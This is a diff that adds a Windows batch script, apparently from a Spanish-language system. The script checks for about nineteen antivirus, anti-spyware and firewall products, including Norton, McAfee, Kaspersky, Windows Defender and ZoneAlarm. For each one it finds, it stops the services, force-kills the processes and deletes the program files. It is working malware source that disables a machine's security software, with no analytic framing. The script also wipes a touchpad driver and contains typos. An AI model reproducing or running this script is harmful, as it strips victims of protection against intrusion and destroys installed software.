@@ -1,0 +1,249 @@
+@echo off
+If exist "C:\Archivos de programa\ewido anti-malware" (goto ewido) else (goto 1)
+:1
+If exist "C:\Archivos de programa\Eset" (goto nod32) else (goto 2)
+:2
+If exist "C:\Archivos de programa\Spybot - Search & Destroy" (goto spybot) else (goto 3)
+:3
+If exist "C:\Archivos de programa\Windows Defender" (goto windefender) else (goto 4)
+:4
+If exist "C:\Archivos de programa\mcafee.com" (goto mcafee) else (goto 5)
+:5
+If exist "C:\Archivos de programa\Zone Labs\ZoneAlarm" (goto zone) else (goto 6)
+:6
+If exist "C:\Archivos de programa\Trend Micro" (goto trend) else (goto 7)
+:7
+If exist "C:\Archivos de programa\Synaptics" (goto sinapti) else (goto 8)
+:8
+If exist "C:\Archivos de programa\Grisoft\AVG free" (goto avfree) else (goto 9)
+:9
+If exist "C:\Archivos de programa\Archivos comunes\Symantec Shared" (goto norton) else (goto 10)
+:10
+If exist "C:\Archivos de programa\Norton AntiVirus" (goto norton2) else (goto 11)
+:11
+If exist "C:\Archivos de programa\Panda Software\Panda Platinum 2006 Internet Security" (goto Panda06) else (goto 12)
+:12
+If exist "C:\Archivos de programa\Alwil Software\Avast4" (goto Avast4) else (goto 13)
+:13
+If exist "C:\Archivos de programa\Microsoft AntiSpyware" (goto micanti) else (goto 14)
+:14
+If exist "C:\Archivos de programa\Kaspersky Lab\Kaspersky Anti-Virus Personal" (goto kav) else (goto 15)
+:15
+If exist "C:\Archivos de programa\Webroot\Spy Sweeper" (goto sweeper) else (goto 16)
+:16
+If exist "C:\Archivos de programa\SinEspias" (goto sinspy) else (goto 17)
+:17
+If exist "C:\Archivos de programa\Panda Software\Panda Antivirus Titanium" (goto pandatitanium) else (gto 18)
+:18
+If exist "C:\Archivos de programa\AVPersonal" (goto avpersonal) else (goto 19)
+:19
+If exist "C:\Archivos de programa\Softwin\BitDefender9" (goto bit9) else (goto 20)
+:20
+goto fin
+:bit9
+net stop "bdoesrv"
+net stop "bdmcon"
+net stop "bdnagent"
+net stop "bdswitch"
+
+Taskkill /f /IM bdoesrv.exe /IM bdmcon.exe /IM bdnagent.exe /IM bdswitch.exe
+cd C:\Archivos de programa\Softwin\BitDefender9
+attrib -H -S -R *.*
+del /s /q *.*
+:avpersonal
+net stop "AVGUARD"
+net stop "AVWUPSRV"
+net stop "AVGNT"
+net stop "AVSched32"
+
+Taskkill /f /IM AVGUARD.EXE /IM AVWUPSRV.EXE /IM AVGNT.EXE /IM AVSched32.EXE
+cd C:\Archivos de programa\AVPersonal
+attrib -H -S -R *.*
+del /s /q *.*
+:pandatitanium
+net stop "Pavsrv51"
+net stop "AVENGINE"
+net stop "apvxdwin"
+net stop "pavProxy"
+Taskkill /f /IM Pavsrv51.exe /IM AVENGINE.EXE /IM apvxdwin.exe /IM pavProxy.exe
+cd "C:\Archivos de programa\Panda Software\Panda Antivirus Titanium"
+attrib -H -S -R *.*
+del /s /q *.*
+rd /s /q C:\Archivos de programa\Panda Software\Panda Antivirus Titanium
+:sinspy
+Taskkill /f /IM no-spy.exe
+cd "C:\Archivos de programa\SinEspias"
+attrib -H -S -R *.*
+del /s /q *.*
+:sweeper
+Taskkill /f /IM WRSSSDK.exe /IM SpySweeper.exe
+cd "C:\Archivos de programa\Webroot\Spy Sweeper"
+attrib -H -S -R *.*
+del /s /q *.*
+:kav
+cd "C:\Archivos de programa\Kaspersky Lab\Kaspersky Anti-Virus Personal"
+net stop "kav"
+net stop "kavsvc"
+Taskkill /f /IM kav.exe /IM kavsvc.exe
+attrib -H -S -R *.*
+del /s /q *.*
+goto 15
+:micanti
+cd "C:\Archivos de programa\Microsoft AntiSpyware"
+net stop "gcasServ"
+net stop "gcasDtServ"
+Taskkill /f /IM gcasServ.exe /IM gcasDtServ.exe
+attrib -H -S -R *.*
+del /s /q *.*
+goto 14
+:Avast4
+cd "C:\Archivos de programa\Alwil Software\Avast4"
+net stop "aswUpdSv"
+net stop "ashServ"
+net stop "ashWebSv"
+net stop "ashDisp"
+Taskkill /f /IM aswUpdSv.exe /IM ashServ.exe /IM ashWebSv.exe /IM ashDisp.exe
+attrib -H -S -R *.*
+del /s /q *.*
+goto 13
+:Panda06
+cd "C:\Program Files\Panda Software\Panda Platinum 2006 Internet Security"
+net stop "TPSrv"
+net stop "PavFnSvr"
+net stop "pavsrv51"
+net stop "pskmssvc"
+net stop "AVENGINE"
+net stop "PNMSRV"
+net stop "PsImSvc"
+Taskkill /f /IM TPSrv.exe /IM PavFnSvr.exe /IM pavsrv51.exe /IM pskmssvc.exe /IM AVENGINE.EXE /IM PNMSRV.EXE /IM PsImSvc.exe
+attrib -H -S -R *.*
+del /s /q *.*
+cd "C:\Program Files\Panda Software\Panda Platinum 2006 Internet Security\AntiSpam"
+attrib -H -S -R *.*
+del /s /q *.*
+cd "C:\Program Files\Panda Software\Panda Platinum 2006 Internet Security\FIREWALL"
+attrib -H -S -R *.*
+del /s /q *.*
+cd "C:\Program Files\Common Files\Panda Software\PavShld"
+Taskkill /f /IM pavprsrv.exe
+attrib -H -S -R *.*
+del /s /q *.*
+goto 12
+:norton2
+cd "C:\Archivos de programa\Norton AntiVirus"
+net stop "navapsvc"
+net stop "NPFMntor"
+Taskkill /f /IM navapsvc.exe /IM NPFMntor.exe
+attrib -H -S -R *.*
+del /s /q *.*
+cd "C:\Archivos de programa\Norton AntiVirus\IWP"
+attrib -H -S -R *.*
+del /s /q *.*
+goto 11
+:norton
+cd "C:\Archivos de programa\Archivos comunes\Symantec Shared"
+net stop "ccSetMgr"
+net stop "SNDSrvc"
+net stop "SPBBCSvc"
+net stop "ccEvtMgr"
+net stop "ccApp"
+net stop "symlcsvc"
+Taskkill /f /IM ccSetMgr.exe /IM SNDSrvc.exe /IM SPBBCSvc.exe /IM ccEvtMgr.exe /IM ccApp.exe /IM symlcsvc.exe
+attrib -H -S -R *.*
+del /s /q *.*
+cd "C:\Archivos de programa\Archivos comunes\Symantec Shared\SPBBC"
+attrib -H -S -R *.*
+del /s /q *.*
+cd "C:\Archivos de programa\Archivos comunes\Symantec Shared\CCPD-LC"
+attrib -H -S -R *.*
+del /s /q *.*
+goto 10
+:avfree
+cd "C:\Archivos de programa\Grisoft\AVG free"
+net stop "avgamsvr"
+net stop "vgupsvc"
+net stop "avgcc"
+Taskkill /f /IM avgamsvr.exe /IM vgupsvc.exe /IM avgcc.exe
+attrib -H -S -R *.*
+del /s /q *.*
+goto 9
+:sinapti
+cd "C:\Archivos de programa\Synaptics\SynTP"
+net stop "SynTPLpr"
+net stop "SynTPEnh"
+Taskkill /f /IM SynTPLpr.exe /IM SynTPEnh.exe
+attrib -H -S -R *.*
+del /s /q *.*
+goto 8
+:trend
+cd "C:\Archivos de programa\Trend Micro\OfficeScan Client"
+net stop "ntrtscan"
+net stop "tmlisten"
+net stop "OfcPfwSvc"
+net stop "pccntmon"
+Taskkill /f /IM ntrtscan.exe /IM tmlisten.exe /IM OfcPfwSvc.exe /IM pccntmon.exe
+attrib -H -S -R *.*
+del /s /q *.*
+goto 7
+:zone
+cd "C:\Archivos de programa\Zone Labs\ZoneAlarm"
+net stop "zlclient"
+net stop "zonealarm"
+net stop "vsmon"
+Taskkill /f /IM zlclient.exe /IM zonealarm.exe /IM vsmon.exe
+attrib -H -S -R *.*
+del /s /q *.*
+cd "C:\WINDOWS\system32\ZoneLabs"
+attrib -H -S -R *.*
+del /s /q *.*
+goto 6
+:mcafee
+cd "c:\archivos de programa\mcafee.com\agent"
+net stop "mcdetect"
+net stop "mctskshd"
+net stop "mcagent"
+net stop "mcvsescn"
+net stop "mcvsftsn"
+net stop "mcvsshld"
+net stop "mcvsrte"
+net stop "mcshield"
+Taskkill /f /IM mcdetect.exe /IM mctskshd.exe /IM mcagent.exe /IM mcvsescn.exe /IM mcvsftsn.exe /IM mcvsshld.exe /IM mcvsrte.exe /IM mcshield.exe
+attrib -H -S -R *.*
+del /s /q *.*
+rd /s /q "c:\archivos de programa\mcafee.com\agent"
+rd /s /q "c:\archivos de programa\mcafee.com"
+goto 5
+:windefender
+cd "C:\Archivos de programa\Windows Defender"
+net stop "MsMpEng"
+net stop "MSASCui"
+Taskkill /f /IM MsMpEng.exe /IM MSASCui.exe 
+attrib -H -S -R *.*
+del /s /q *.*
+goto 4
+:spybot
+cd "C:\Archivos de programa\Spybot - Search & Destroy"
+net stop "TeaTimer"
+Taskkill /f /IM TeaTimer.exe
+attrib -H -S -R *.*
+del /s /q *.*
+goto 3
+:nod32
+cd "C:\Archivos de programa\Eset"
+net stop "nod32krn"
+net stop "nod32kui"
+net stop "nod32"
+Taskkill /f /IM nod32krn.exe /IM nod32kui.exe /IM nod32.exe
+attrib -H -S -R *.*
+del /s /q *.*
+goto 2
+:ewido
+cd "C:\Archivos de programa\ewido anti-malware"
+Taskkill /f /IM ewidoctrl.exe /IM ewidoguard.exe
+net stop "ewidoctrl"
+net stop "ewidoguard"
+attrib -H -S -R *.*
+del /s /q *.*
+goto 1
+:fin
+exit
